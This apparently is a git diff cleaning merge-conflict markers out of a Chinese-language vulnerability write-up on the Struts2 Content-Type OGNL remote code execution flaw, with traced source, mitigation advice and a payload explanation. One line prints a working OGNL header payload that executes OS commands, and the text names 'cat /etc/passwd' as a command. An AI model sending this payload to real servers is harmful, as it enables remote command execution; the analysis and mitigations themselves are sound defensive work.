@@ -54,12 +54,7 @@ public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
         this.prepare.setEncodingAndLocale(request, response);
         this.prepare.createActionContext(request, response);
         this.prepare.assignDispatcherToThread();
-<<<<<<< HEAD
-        request = this.prepare.wrapRequest(request); 
-        // Struts2对输入请求对象request的进行封装
-=======
         request = this.prepare.wrapRequest(request); // Struts2对输入请求对象request的进行封装
->>>>>>> origin/master
         ActionMapping mapping = this.prepare.findActionMapping(request, response, true);
         if (mapping == null)
         {
@@ -90,12 +85,7 @@ public HttpServletRequest wrapRequest(HttpServletRequest oldRequest)
     HttpServletRequest request = oldRequest;
     try
     {
-<<<<<<< HEAD
-      request = this.dispatcher.wrapRequest(request); 
-      // wrapRequest再次封装
-=======
       request = this.dispatcher.wrapRequest(request); // wrapRequest再次封装
->>>>>>> origin/master
     }
     catch (IOException e)
     {
@@ -143,12 +133,7 @@ public MultiPartRequestWrapper(MultiPartRequest multiPartRequest, HttpServletReq
     setLocale(request);
     try
     {
-<<<<<<< HEAD
-      this.multi.parse(request, saveDir);  
-      // parse函数进行解析request
-=======
       this.multi.parse(request, saveDir);  // parse函数进行解析request
->>>>>>> origin/master
       for (String error : this.multi.getErrors()) {
         addError(error);
       }
@@ -189,12 +174,7 @@ public void parse(HttpServletRequest request, String saveDir)
       if (LOG.isWarnEnabled()) {
         LOG.warn("Unable to parse request", e, new String[0]);
       }
-<<<<<<< HEAD
-      String errorMessage = buildErrorMessage(e, new Object[0]); 
-      // 对捕获的异常进行处理
-=======
       String errorMessage = buildErrorMessage(e, new Object[0]); // 对捕获的异常进行处理
->>>>>>> origin/master
       if (!this.errors.contains(errorMessage)) {
         this.errors.add(errorMessage);
       }
@@ -294,12 +274,7 @@ public List<FileItem> parseRequest(RequestContext ctx)
     boolean successful = false;
     try
     {
-<<<<<<< HEAD
-      FileItemIterator iter = getItemIterator(ctx); 
-      // 跟踪getItemIterator(ctx)方法
-=======
       FileItemIterator iter = getItemIterator(ctx); // 跟踪getItemIterator(ctx)方法
->>>>>>> origin/master
       FileItemFactory fac = getFileItemFactory();
       if (fac == null) {
         throw new NullPointerException("No FileItemFactory has been set.");
@@ -364,12 +339,7 @@ public FileItemIterator getItemIterator(RequestContext ctx)
   {
     try
     {
-<<<<<<< HEAD
-      return new FileItemIteratorImpl(ctx); 
-      // 继续跟踪FileItemIteratorImpl(ctx)方法
-=======
       return new FileItemIteratorImpl(ctx); // 继续跟踪FileItemIteratorImpl(ctx)方法
->>>>>>> origin/master
     }
     catch (FileUploadIOException e)
     {
@@ -436,11 +406,7 @@ protected String buildErrorMessage(Throwable e, Object[] args)
 header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 ```
 
-<<<<<<< HEAD
-通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终，通过如下图代码，将攻击指令执行
-=======
 通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终将攻击指令执行
->>>>>>> origin/master
 
 **批量检测POC执行效果**
 
@@ -472,15 +438,6 @@ header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@D
 
 - 方法二：
 
-<<<<<<< HEAD
-  最保险的办法直接使用最新版struts2的jar包替换原jar文件进行升级，有三个包必须要升级（升级前备份原版本jar包）：
-
-  - Struts2-core-2.3.32.jar：struts2核心包，也是此漏洞发生的所在；
-  - xwork-core-2.3.32.jar：struts2依赖包，版本跟随struts2一起更新；
-  - ongl-3.0.19.jar：用于支持ognl表达式，为其他包提供依赖；
-
-  建议先在测试环境进行升级测试，查看是否会影响业务正常运行。
-=======
   设置Servlet全局过滤器，校验Content-Type 值，过滤器参考如下： 
 
   在 web.xml 中配置Filter
@@ -556,7 +513,6 @@ header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@D
   ```
 
   ​
->>>>>>> origin/master
 
   ​
 
@@ -568,8 +524,4 @@ header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@D
 
 **感谢我盟！感谢6哥！**
 
-<<<<<<< HEAD
 ​
-=======
-​
->>>>>>> origin/master
